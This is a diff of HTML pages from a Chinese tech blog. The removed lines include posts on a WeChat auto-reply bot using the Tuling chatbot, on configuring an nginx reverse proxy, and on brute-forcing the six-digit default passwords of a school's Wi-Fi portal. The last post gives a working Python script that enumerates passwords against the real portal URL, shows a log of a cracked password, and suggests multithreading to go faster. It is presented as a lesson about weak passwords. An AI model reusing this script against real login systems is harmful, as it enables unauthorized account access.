-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">friend.send(&#39;for test&#39;)             #自动向&quot;AIbot&quot;好友发送消息</span><br><span class="line">group.send(&#39;for test&#39;)             #自动向&quot;test&quot;群组发送消息</span><br></pre></td></tr></table></figure>
-<p>自动回复消息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@bot.register(friend)         # 回复 friend 的消息</span><br><span class="line">def reply_my_friend(msg):</span><br><span class="line">    return &#39;received: &#123;&#125;)&#39;.format(msg.text)        # 回复消息内容</span><br><span class="line"></span><br><span class="line">@bot.register([friend,Group])          #自动回复所有好友和群聊</span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    if isinstance(msg.chat, Group) and not msg.is_at:</span><br><span class="line">        return                      #如果是群聊，但没有被 @，则不回复</span><br><span class="line">    else:</span><br><span class="line">        return &#39;收到消息: &#123;&#125;&#39;.format(msg.text)        # 回复消息内容</span><br></pre></td></tr></table></figure>
-<h2 id="3-引入图灵机器人："><a href="#3-引入图灵机器人：" class="headerlink" title="3.引入图灵机器人："></a>3.引入图灵机器人：</h2><p>引入智能聊天机器人，才是python玩微信的精髓hhh。wxpy库目前提供了两种自动聊天机器人接口，图灵机器人和小i机器人，本文中选择受众度更高的图灵机器人。<br>调用图灵机器人需要申请api-key，<a target="_blank" rel="noopener" href="http://www.turingapi.com/">申请点击链接即可！</a></p>
-<p>下面给出图灵机器人自动回复好友”AIbot”消息的全代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from wxpy import *</span><br><span class="line">bot &#x3D; Bot()</span><br><span class="line">friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]</span><br><span class="line">tuling &#x3D; Tuling(api_key&#x3D;&#39;4e2xxxxxxxa8&#39;)    #api_key为你申请的api_key</span><br><span class="line"></span><br><span class="line">@bot.register(friend)</span><br><span class="line">def reply_my_friend(msg):</span><br><span class="line">    tuling.do_reply(msg)     #图灵机器人自动回复</span><br><span class="line"></span><br><span class="line">bot.join()              #保持登陆状态</span><br></pre></td></tr></table></figure>
-<p>话不多说，上图，日常基本聊天还是可以的：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1ltVDlmSy5qcGc?x-oss-process=image/format,png" alt="和图灵机器人的聊天"><br>图灵机器人的智能化程度还是很高的，日常聊天都很ok。<br>但是虽然是免费的，但是有限制次数，认证后一天100条。总的来说日常简短的聊天还是不错的选择。</p>
-<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA/" rel="tag">图灵机器人</a></li></ul>
+
     </footer>
   </div>
 
@@ -511,29 +395,20 @@
     <div class="article-meta">
       <a href="/2019/12/26/linux%E9%85%8D%E7%BD%AEnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/" class="article-date">
   <time datetime="2019-12-25T16:00:00.000Z" itemprop="datePublished">2019-12-26</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>将web项目部署到服务器之后，通过nginx反向代理可以帮助隐藏web项目所在的端口号，避免了端口暴露在外的风险，本文主要讲述反向代理的概念和在linux环境下如何配置nginx反向代理。</strong></p>
-<h2 id="1-什么是反向代理？"><a href="#1-什么是反向代理？" class="headerlink" title="1.什么是反向代理？"></a>1.什么是反向代理？</h2><p>反向代理（Reverse Proxy）方式:<br>是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。通常的代理服务器，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中。当一个代理服务器能够代理外部网络上的主机，访问内部网络时，这种代理服务的方式称为反向代理服务。<br>简单来讲，正向代理是作为客户端的代理服务器，反向代理则是作为服务器端的代理服务器。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1laalg2Sy5qcGc?x-oss-process=image/format,png" alt="nginx反向代理"></p>
-<h2 id="2-安装nginx服务器"><a href="#2-安装nginx服务器" class="headerlink" title="2.安装nginx服务器"></a>2.安装nginx服务器</h2><p>安装步骤非常简单，打开终端，输入：<br><code>sudo apt-get install nginx</code></p>
-<p>在终端输入以下内容，打开nginx服务器：<br><code>service nginx start</code></p>
-<h2 id="3-配置nginx服务器"><a href="#3-配置nginx服务器" class="headerlink" title="3.配置nginx服务器"></a>3.配置nginx服务器</h2><p>apt-get安装下的nginx配置文件的位置在 /etc/nginx/sites-available/default，打开default文件，并将proxy_pass处的值，改为你想要代理的服务器端口地址。(下图中代理的为5000端口号）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">    </span><br><span class="line">        location &#x2F; &#123; </span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_pass &quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;;</span><br><span class="line">        &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来要将配置信息重新载入，终端输入：<br><code>/etc/init.d/nginx reload</code></p>
-<h2 id="4-测试结果"><a href="#4-测试结果" class="headerlink" title="4.测试结果"></a>4.测试结果</h2><p>打开一个本地web项目，开放在5000端口<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llQzJFOC5wbmc?x-oss-process=image/format,png" alt="打开一个flask项目，并开放在5000端口"><br>在浏览器中输入url：0.0.0.0或0.0.0.0:80（因为nginx默认开放80端口，并且可以省略端口号）<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llQ1JVUy5wbmc?x-oss-process=image/format,png" alt="访问nginx端口号，并成功返回flask项目内容"><br>可以看到，浏览器显示的内容正是开放在5000端口的flask项目。</p>
-<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/" rel="tag">反向代理</a></li></ul>
+
     </footer>
   </div>
 
@@ -565,29 +440,65 @@
     <div class="article-meta">
       <a href="/2019/04/26/python%E8%84%9A%E6%9C%AC-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E7%BD%91%E5%BC%B1%E5%AF%86%E7%A0%81/" class="article-date">
   <time datetime="2019-04-25T16:00:00.000Z" itemprop="datePublished">2019-04-26</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）</strong><br><strong>攻击过程如下：</strong></p>
-<h2 id="1-获取get参数"><a href="#1-获取get参数" class="headerlink" title="1.获取get参数"></a>1.获取get参数</h2><p><strong>在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。</strong></p>
-<p>登陆无线网前需要在网页上进行身份验证。<br><img src="https://s2.ax1x.com/2019/04/26/Eni5OU.png" alt="验证界面"><br>随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。<br><img src="https://s2.ax1x.com/2019/04/26/EniomF.png" alt="获取输入的get参数"><br>看一下回显结果，提示<code>&quot;result&quot;:&quot;0&quot;</code>等信息。<br><img src="https://s2.ax1x.com/2019/04/26/EniTw4.png" alt="验证失败回显内容"><br>我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示<code>&quot;result&quot;:&quot;1&quot;,&quot;认证成功&quot;</code>等信息。<br><img src="https://s2.ax1x.com/2019/04/26/Eni7TJ.png" alt="验证正确回显内容"><br>ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。</p>
-<h2 id="python脚本暴力破解"><a href="#python脚本暴力破解" class="headerlink" title="python脚本暴力破解"></a>python脚本暴力破解</h2><p>直接上代码吧：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from time import strftime</span><br><span class="line">from itertools import product</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line">from requests import post</span><br><span class="line">import re</span><br><span class="line">import threading    #可开启多线程</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">def fx(iter&#x3D;[&#39;0123456789&#39;]):</span><br><span class="line">  def psgen(x):    #密码生成器，穷举所有的密码可能性，参数x表示密码长度</span><br><span class="line">    for r in iter:</span><br><span class="line">      for repeat in range(x,x+1):</span><br><span class="line">        for ps in product(r,repeat&#x3D;repeat):</span><br><span class="line">          yield &#39;&#39;.join(ps)</span><br><span class="line">  for ps in psgen(6):</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;%s&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759&#39;%ps</span><br><span class="line">    try:</span><br><span class="line">      s&#x3D;requests.session()</span><br><span class="line">      rs&#x3D;s.get(url).content.decode(&#39;utf-8&#39;)</span><br><span class="line">      r &#x3D; re.findall(r&#39;认证成功&#39;,rs)        #判断验证结果</span><br><span class="line">      if r: </span><br><span class="line">        with open(&quot;resut.csv&quot;,&quot;a+&quot;) as f:    #存储密码结果到result.csv文件中</span><br><span class="line">          f.write(&#39;密码破解成功结果为：,&#39;+ ps + &#39;,&#39; + strftime(&quot;%c&quot;) + &#39;,&#39; + url+&#39;\n&#39;)</span><br><span class="line">        print(&#39;密码破解成功：&#39;+ps+&#39; ,&#39;+rs)</span><br><span class="line">        break</span><br><span class="line">      else:</span><br><span class="line">        print(ps+&#39;密码不正确&#39;+rs)</span><br><span class="line">    except:</span><br><span class="line">      sleep(1)</span><br><span class="line">      pass</span><br><span class="line">      </span><br><span class="line">fx([&#39;0123456789&#39;])</span><br></pre></td></tr></table></figure>
-<p>接下来运行等待结果就ok了。看一下运行过程图：<br><img src="https://s2.ax1x.com/2019/04/26/Enibk9.png" alt="暴力破解过程图"><br>由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;15xxxx&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759</span><br></pre></td></tr></table></figure>
-<p><strong>速度慢可以开启多线程，同时进行测试。结果好很多！</strong></p>
-<h4 id="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"><a href="#爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！" class="headerlink" title="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"></a>爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！</h4> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-利用docker将web项目部署到服务器"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"
+    >利用docker将web项目部署到服务器</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="article-date">
+  <time datetime="2019-03-30T16:00:00.000Z" itemprop="datePublished">2019-03-31</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
+    </div>
+       
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li></ul>
+
     </footer>
   </div>
 
